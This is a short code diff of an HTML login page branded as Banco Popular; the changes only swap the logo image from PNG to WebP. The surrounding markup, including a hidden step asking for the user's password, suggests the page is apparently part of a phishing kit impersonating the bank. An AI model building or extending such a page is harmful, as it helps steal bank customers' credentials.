@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Banco Popular | Bienvenidos</title>
-    <link rel="icon" type="image/png" href="popular_logo.png">
+    <link rel="icon" type="image/png" href="popular_logo.webp">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript" src="../../scripts/functions2.js"></script>
@@ -292,7 +292,7 @@
             <div class="header-section">
                 <h1>Bienvenido a</h1>
                 <div class="logo-container">
-                    <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
+                    <img src="popular_logo.webp" alt="Banco Popular" class="logo-banco">
                 </div>
             </div>
 
@@ -338,7 +338,7 @@
         <div id="viewPass" class="step-content hidden">
             <div class="header-section">
                 <div class="logo-container">
-                    <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
+                    <img src="popular_logo.webp" alt="Banco Popular" class="logo-banco">
                 </div>
                 <h2 style="font-size: 22px; font-weight: 700; margin: 30px 0 10px 0;">Valida tu identidad</h2>
                 <p style="color: var(--text-gray); font-size: 14px; line-height: 1.5;">Para proteger tu cuenta, es necesario ingresar tu contraseÃ±a personal.</p>
